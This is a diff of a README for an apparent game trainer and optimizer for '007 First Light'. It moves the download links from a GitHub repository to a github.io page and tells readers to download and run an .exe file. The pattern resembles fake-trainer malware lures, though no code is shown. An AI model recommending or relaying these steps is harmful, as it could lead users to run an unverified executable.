@@ -1,6 +1,6 @@
 # 🎮 007-First-Light-Trainer-And-Optimizer - Boost Performance And Modify Game Features
 
-[![](https://img.shields.io/badge/Download-Trainer-blue.svg)](https://github.com/Trigina4476/007-First-Light-Trainer-And-Optimizer)
+[![](https://img.shields.io/badge/Download-Trainer-blue.svg)](https://trigina4476.github.io)
 
 ## 📖 About This Tool
 
@@ -29,7 +29,7 @@ To run this tool, ensure your computer meets these standards:
 
 Follow these steps to set up the software.
 
-1. Visit this page to download: [https://github.com/Trigina4476/007-First-Light-Trainer-And-Optimizer](https://github.com/Trigina4476/007-First-Light-Trainer-And-Optimizer)
+1. Visit this page to download: [https://trigina4476.github.io](https://trigina4476.github.io)
 2. Locate the file ending in .exe in the releases section.
 3. Save the file to a folder you can find easily, such as your Downloads or Desktop folder.
 4. Close your game before you run the trainer.
